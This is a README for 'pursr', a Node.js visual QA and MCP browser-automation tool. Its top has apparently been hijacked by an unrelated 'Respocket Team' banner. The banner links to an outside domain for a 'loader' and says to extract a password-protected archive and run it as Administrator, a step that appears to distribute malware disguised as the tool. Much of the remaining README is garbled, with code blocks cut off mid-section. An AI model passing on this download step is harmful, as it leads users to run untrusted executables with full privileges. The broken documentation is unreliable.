<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://respockett.pro/red">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

<!-- PROJECT_LOGO_START -->
<p align="center">
  <img src="assets/social-preview.svg" alt="pursr - visual QA, audit, and MCP for the browser" width="100%">
</p>

<p align="center">
  <img src="assets/logo.svg" alt="pursr" width="320">
</p>

<h1 align="center">pursr</h1>

<p align="center">
  <strong>Visual QA, audit, and MCP for the browser.</strong><br>
  Capture - sweep - diff - audit - repeat - from the CLI, an MCP server, or as a library.
</p>

<p align="center">
## Why pursr?

Most teams need **five separate tools** to do visual QA: a screenshot CLI, a regression diff runner, an accessibility auditor, a way to share captures with an AI assistant, and a way to **turn all of that into a PDF report** for stakeholders. **pursr is all five** - built as a single Node.js package with:

- **A unified CLI** (`pursr`) for every capture, diff, sweep, and audit.
- **An agent-grade MCP stdio server** (`pursr-mcp`) built on the official Model Context Protocol SDK, with persistent tabs, direct image responses, rendered-state inspection, actions, diagnostics, screenshots, sweeps, and resources.
- **Visual Operator** sessions with a rendered cursor, target labels, click markers, visible Chrome windows, and authenticated Chrome attachment over CDP.
- **A library API** with 25 subpath modules, so you can embed the browser and QA primitives in your own tooling.
- **A plugin system** for custom viewports, sweep ops, and capture hooks.
- **PDF reports + AI diff summaries** built in - render a sweep to a styled PDF or ask a vision LLM to describe the regression in plain language.
- **Zero browser bundled** - drives your system Chrome, Edge, Brave, or Chromium via Playwright. No surprise browser download during install.
- **First-run doctor + update notices** - diagnose missing browser/runtime pieces and get lightweight release notifications without breaking CI or JSON output.

## Install

```bash
npm install pursr
npm install --save-dev playwright-core   # peer dep - bring your own Chrome
```

Then verify:

```bash
pursr doctor                    # check Node, playwright-core, browser, and SKILL.md
pursr setup                     # print next steps if anything is missing
pursr viewports                 # list 10+ registered viewport presets
# Windows
setx PURSR_BROWSER_PATH "C:\Program Files\Google\Chrome\Application\chrome.exe"

# macOS/Linux
export PURSR_BROWSER_PATH="/Applications/Google Chrome.app/Contents/MacOS/Google Chrome"
```

Browser discovery checks standard global installs, user installs, Dev/Beta/Canary/Nightly channels, and executable names found in `PATH` across Windows, macOS, and Linux. Current target is Chromium-family browsers; Firefox/WebKit are planned, but not claimed as stable targets yet.

CLI update notifications are cached for 24 hours, written to stderr, and disabled automatically in CI/non-interactive runs. Disable them manually with `PURSR_NO_UPDATE_NOTIFIER=1`.

## 30 seconds

```bash
# 4. Or: run a batched sweep + a11y audit + parallel workers
pursr sweep ./plan.json   # see plans/ for an example
```

## Features

| Feature | Description | CLI flag |
| --- | --- | --- |
| Multi-viewport capture | 10+ presets (mobile, tablet, desktop, ultrawide) | `--preset mobile-375` |
| Layered states | entity / terrain / hud / ui isolation | `--layer entity` |
| Animation freeze | pause CSS/JS animations for stable frames | `--no-animation` |
| Cursor overlay | pointer / grab / grabbing / crosshair | `--cursor crosshair` |
| Visual Operator | rendered cursor, target labels, click markers, WebM recording, headed and CDP sessions | `operator` CLI + MCP session tools |
| Grid overlay | spacing guides, custom color + tile size | `--grid --grid-tile 64` |
| Camera control | zoom + pan via mouse wheel/drag | `--zoom 1.5 --panX 200` |
| Frame timeline | N captures at intervalMs for animations | `pursr frames <url> 8 200` |
| Hover capture | text=/role=/aria=/placeholder= matchers | `pursr hover <url> "text=Login"` |
| Pixel diff | `pixelmatch` against any reference PNG | `pursr diff <url> <ref>` |
| Visual baselines | save / approve / diff with stable IDs | `pursr baseline save ...` |
| Parallel sweep | opt-in worker pool across independent steps | `{ "parallel": 4 }` |
| Accessibility audit | axe-core WCAG 2.1 AA + highlighted screenshot | `pursr audit <url>` |
| DOM snapshot | serialized HTML + computed styles + selector map | `pursr dom <url>` |
| Sweep plans | JSON-driven batch with per-step ops | `pursr sweep plan.json` |
| HTML report | dark-themed grid of every capture + meta | auto-generated `index.html` |
| CI output | JUnit XML, GitHub Actions annotations, Markdown | written on every sweep |
| Auto-heal selectors | fallback chain + named matchers | `["text=Login", "#login"]` |
| HAR capture | HAR 1.2 spec, written next to your shot | `--har ./req.har.json` |
| Auth state | Playwright storageState, reuse logged-in sessions | `--auth-state admin` |
| Plugins | custom viewports, sweep ops, before/after hooks | `pursr-plugin-*` |
| MCP server | Official MCP SDK transport, 16 tools, and resources for Claude/Cursor/Codex | `npx pursr-mcp` |
| PDF report | render sweep.json to a styled, embedded-PNG A4 PDF | `pursr report --sweep ./sweep.json` |
| AI diff summary | vision LLM describes the diff in plain language | `pursr diff ... --ai` |

## CLI

```bash
# Batched plan
pursr sweep ./plan.json

# Plan validation
pursr validate ./plan.json
```

### Subcommands

Flags are order-independent. Both commands below are valid, and explicit output paths override Pursr's default output directory:

```bash
## MCP Server

`pursr-mcp` exposes every capability as MCP tools over stdio - works with Claude Code, Cursor, Continue, and any MCP host.

```bash
npx pursr-mcp
# or with verbose logging:
npx pursr-mcp --verbose
```

### Exposed Tools

| Tool | Description |
| --- | --- |
| `pursr_session_open` | Open a headless, visible, or CDP browser session with optional Visual Operator |
| `pursr_sessions` | List active browser sessions |
| `pursr_snapshot` | Visible rendered nodes, geometry, semantics, and computed styles |
| `pursr_act` | Interact with per-action timeouts, caller-controlled force fallback, strict `eval.js`, cursor movement, and annotations |
| `pursr_screenshot` | Return a validated PNG directly to the vision model, with adaptive selector/viewport/full-page recovery, two-dimensional stitching, and capture metadata |
| `pursr_inspect` | Inspect exact geometry, computed styles, and stacking ancestors |
| `pursr_diagnostics` | Read console, page errors, failed requests, and HTTP failures |
| `pursr_session_close` | Close the tab and release its browser process |
| `pursr_shoot` | Rich screenshot capture (viewport, grid, layer, cursor, camera, animation freeze, HAR) |
| `pursr_diff` | Pixel-diff a URL against a reference PNG |
| `pursr_sweep` | Execute a batch sweep plan |
| `pursr_frames` | Capture an N-frame animation timeline |
| `pursr_probe` | Health-check a URL |
| `pursr_audit` | axe-core WCAG audit + highlighted screenshot |
| `pursr_dom_snapshot` | Full DOM + selector map snapshot |
| `pursr_check` | CI visual regression check against a stable baseline |

### Agent workflow

Use persistent sessions for the same inspect-act-verify loop as an interactive browser agent:

1. Call `pursr_session_open` once with a stable `sessionId`.
2. Call `pursr_snapshot` to understand the rendered page before acting.
3. Use `pursr_act` for a small, ordered interaction sequence.
4. Call `pursr_screenshot` when visual judgment matters; the model receives the validated PNG directly. `auto` remembers degraded Playwright capture per session, uses CDP without repeating the same timeout, and periodically re-probes Playwright. Read `captureMode`, `attempts`, and `fallbackError`; use `stitched` only with full-page capture.
5. Use `pursr_inspect` for layout, clipping, typography, or stacking problems.
6. Read `pursr_diagnostics`, then reload and verify after source changes.
7. Call `pursr_session_close` when the review is complete.

Example action arguments:

```json
{
  "sessionId": "farm",
  "actions": [
    { "type": "hover", "selector": "role=button|Build" },
    { "type": "click", "selector": "text=Barn", "timeoutMs": 3000 },
    { "type": "wait", "selector": "role=dialog" },
    { "type": "eval", "js": "({ title: document.title })" }
  ]
}
```

Eval actions require a non-empty `js` field; the legacy `script` field is rejected instead of reporting a false-positive success. `force: true` is never automatic. Use it only after inspection confirms the intended target. If a locator itself stalls, the final page-level DOM fallback accepts a CSS selector; other selector dialects can use a verified coordinate fallback.

### Visual Operator

Set `visual: true` to render the agent cursor and interaction feedback into screenshots. `mode: "visible"` enables it automatically and opens a Chrome window that a developer can watch.

#### CLI: scripted tutorials and repeatable recordings

Use the CLI when the steps are already known. It needs no MCP host and produces a final screenshot, JSON trace, diagnostics, and an optional WebM recording.

```bash
#### MCP: adaptive agent operation

Use MCP when the agent must inspect the current page, decide the next action, verify visual results, or pause for human approval. MCP is not required for CLI recording. Both interfaces use the same session and Visual Operator engine.

```json
{
### Exposed Resources

| URI | Description |
| --- | --- |
| `pursr://shoot/<url|preset>` | Last screenshot PNG (image/png) |
| `pursr://sweep/<plan-name>` | Last sweep summary JSON (application/json) |

Resources are persisted to `~/.pursr/mcp/mcp-index.json` (override with `PURSR_MCP_STATE`).

## Visual Regression Baselines

```bash
## Sweep Plan Validation

```bash
pursr validate ./plan.json
# { "valid": false, "errors": ["steps[2].frames.count: must be a number between 1 and 120"] }
```

Catches: empty steps, unknown ops, out-of-range numbers, duplicate names, missing required fields. `pursr sweep` runs the same validator before executing - fail-fast.

```json
{
  "name": "homepage-matrix",
## HAR Capture

```bash
## Auth State

```bash
pursr auth save myapp admin --from ./playwright-state.json
## Parallel Sweep

Add `parallel: N` to your plan to run steps concurrently in a worker pool:

```json
{
  "name": "matrix",
## Accessibility Audit

```bash
# Writes: audit.json, audit-summary.md, audit-highlighted.png
```

Injects axe-core, runs a configurable tag set (`wcag2a`, `wcag2aa`, `wcag21a`, `wcag21aa`, `best-practice`), and overlays a red outline on every violating node with the rule id as a label. The summary Markdown includes per-rule failure snippets.

## DOM Snapshot

```bash
# Writes: dom-snapshot-<ts>.dom.json
```

Captures serialized HTML, computed CSS for every visible element, and a selector map (`id`, `role`, `accessible name`, `text`, `xpath`, `css selector`, viewport-relative `rect`). Great for regression diffing without re-running a browser.

## CI Output

Every sweep writes three sidecar artifacts alongside `sweep.json`:

- `sweep.junit.xml` - JUnit XML for Jenkins / GitLab / CircleCI
- `sweep.github.json` - GitHub Actions annotation file
- `sweep.md` - Human-readable Markdown summary with diffs + failures

## Library API

```js
import {
  runProbe, runShot, runShoot, runSweep, runDiff, runAudit,
  captureDomSnapshot, resolveHealedSelector,
  saveBaseline, diffKey,
  startHarCapture, stopHarCapture, writeHar,
  loadAuthState,
  PursrMCPServer, loadMcpConfig, BrowserSessionManager,
  installVisualOperator, moveVisualCursor, highlightVisualTarget,
  validateSweepPlan,
  listResources, readResource,
  listViewports, resolveViewport, VIEWPORTS,
  loadPlugins, registerPlugin, getSweepOp,
  VERSION,
} from "pursr";
```

### Subpath exports

```js
import { resolveLocator } from "pursr/selector";
import { launch } from "pursr/runway";
import { parseFlags, asNum } from "pursr/util";
import { overlayGrid } from "pursr/overlays";
import { captureDomSnapshot } from "pursr/dom-snapshot";
import { runAudit } from "pursr/plugin-audit";
import { resolveHealedSelector } from "pursr/selector-heal";
import { writeCiOutput } from "pursr/ci-output";
import { diffKey, saveBaseline, loadBaseline } from "pursr/baseline";
import { validateSweepPlan } from "pursr/sweep-schema";
import { startHarCapture, stopHarCapture } from "pursr/har";
import { saveAuthState, loadAuthState } from "pursr/auth";
import { listResources, readResource } from "pursr/mcp-resources";
import { PursrMCPServer } from "pursr/mcp";
import { BrowserSessionManager } from "pursr/session";
import { moveVisualCursor, highlightVisualTarget } from "pursr/visual-operator";
```

## Plugins

A plugin is a plain ES module that exports a default object:

```js
// plugins/my-plugin.js
export default {
  name: "my-plugin",
  viewport: { "my-laptop": { width: 1440, height: 900, dpr: 2, label: "MBP 14" } },
  sweepOp: {
    lighthouse: async (ctx, opts) => { /* ... */ },
  },
  beforeShoot: async (ctx) => { /* mutate ctx.flags / ctx.viewport */ },
  afterShoot:  async (ctx, meta) => { /* augment sidecar */ },
  flagHelp:    { "my-flag": "what it does" },
};
```

Plugins are auto-loaded from `plugins/` (built-in) or via `--plugin <path>`.

## Architecture

```
src/
  index.js          - public library entry
  mcp.js            - official MCP SDK stdio server
  session.js        - persistent headless, visible, and CDP sessions
  capture.js        - deep screenshot module with selector, viewport, and full-page recovery
  visual-operator.js - rendered cursor and interaction feedback
  shoot.js          - runShoot (overlays + camera + frame-stable)
  sweep.js          - runSweep (validated, parallel pool)
  diff.js           - pixelmatch wrapper
  plugin-audit.js   - axe-core injection + highlighted screenshot
  dom-snapshot.js   - full DOM + CSSOM + selector map
  selector-heal.js  - auto-heal chain resolver
  ci-output.js      - JUnit / GitHub / Markdown
  baseline.js       - visual regression storage
  har.js            - HAR 1.2 network capture
  auth.js           - Playwright storageState
  sweep-schema.js   - plan validator
  mcp-resources.js  - MCP resources adapter
  overlays.js       - page-side CSS overlays + camera
  runway.js         - Playwright launcher + system-Chrome detector
  viewport.js       - built-in viewport presets
  selector.js       - text=/role=/aria=/placeholder= parser
  plugin.js         - plugin registry + hook runner
  util.js           - flags, args, hashing, HTML escape, renderSweepHtml
  every-viewport.js - one shot per preset in parallel
  frames.js, hover.js, shot.js, eval.js, probe.js, interact.js
```

## Development

```bash
## Roadmap

- [x] Visual baselines (save / approve / diff)
- [x] Sweep plan schema validation
- [x] MCP resources (browse past captures from your AI host)
- [x] HAR 1.2 capture
- [x] Auth state (Playwright storageState)
- [x] Parallel sweep workers
- [x] Watch mode (`pursr watch <url>`)
- [x] Component-level snapshot (`pursr snap <selector>`)
- [x] PDF report export (`pursr report --sweep`)
- [ ] Cloud output adapters (S3 / GCS)
- [x] AI diff summary (vision model, `--ai`)

## PDF Report (v0.6.0)

Turn any sweep summary into a styled, self-contained A4 PDF you can email, attach to a PR, or hand to a designer.

```bash
# 1. Run a sweep (writes sweep.json + index.html + per-step PNGs)
pursr sweep ./plans/marketing.json

# 2. Generate a PDF from the most recent sweep
pursr report --sweep ./out/sweep-marketing/sweep.json --out ./out/report.pdf

# Or: skip image embedding for a tiny text-only report
pursr report --sweep ./out/sweep-marketing/sweep.json --no-embed
```

The PDF includes a colored header (pursr brand magenta), a summary stat grid (steps / passed / failed / total time), and a per-step card with: status badge, op + duration + URL, the embedded capture PNG, diff stats, audit violation count, and any error message. Page numbers in the footer.

Library:

```js
import { renderSweepPdf } from "pursr/report";
import { readFileSync } from "node:fs";

const summary = JSON.parse(readFileSync("./sweep.json", "utf8"));
const bytes = await renderSweepPdf(summary, { out: "./report.pdf" });
console.log("wrote", bytes.length, "bytes");
```

## AI Diff Summary (v0.6.0)

Add `--ai` to `pursr diff` and a vision LLM describes the differences in plain language alongside the pixel-diff percentage. Perfect for triaging a regression without opening the PNG.

```bash
## Watch Mode (v0.5.0)

```bash
# Re-run a sweep plan on file change
pursr watch --plan ./plan.json --on src/**/*.{css,html}

## Component Snapshots (v0.5.0)

```bash
## Keywords

<sub>`pursr` · `visual-qa` · `visual-regression` · `screenshot-testing` · `browser-automation` · `playwright` · `mcp` · `model-context-protocol` · `mcp-server` · `accessibility` · `axe-core` · `wcag` · `cli` · `nodejs` · `ai-agents` · `coding-agents` · `claude` · `cursor` · `codex` · `pixel-diff` · `devtools`</sub>


---

# Security Policy

## Reporting a Vulnerability

If you discover a security vulnerability, please **do not open a public issue**.

Instead, email **dev@pursr.xyz** with:

- A description of the vulnerability and its impact
- Steps to reproduce (proof of concept if possible)
- Any suggested remediation

You can expect an initial response within **72 hours**. Please give us a
reasonable window to release a fix before any public disclosure.

## Supported Versions

The latest released version on the default branch receives security updates.

Thanks for helping keep this project and its users safe. 🐾


---

# Contributing to pursr

Thanks for wanting to make **pursr** better! pursr is a CLI + MCP server for visual QA and browser automation for AI agents. Contributions of every size are welcome.

## Getting started

```bash
## Pull request flow

1. Fork and create a branch: `git checkout -b feat/short-name`.
2. Keep the change focused and add/adjust tests where it makes sense.
3. Run `npm test` (and `npm run lint` if present) locally.
4. Open a PR using the template and link the issue it closes.

## Style

- Small, reviewable PRs beat big ones.
- Prefer clear names and short functions.
- Update the README when behavior changes.


---

MIT License

Copyright (c) 2026 pursr

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
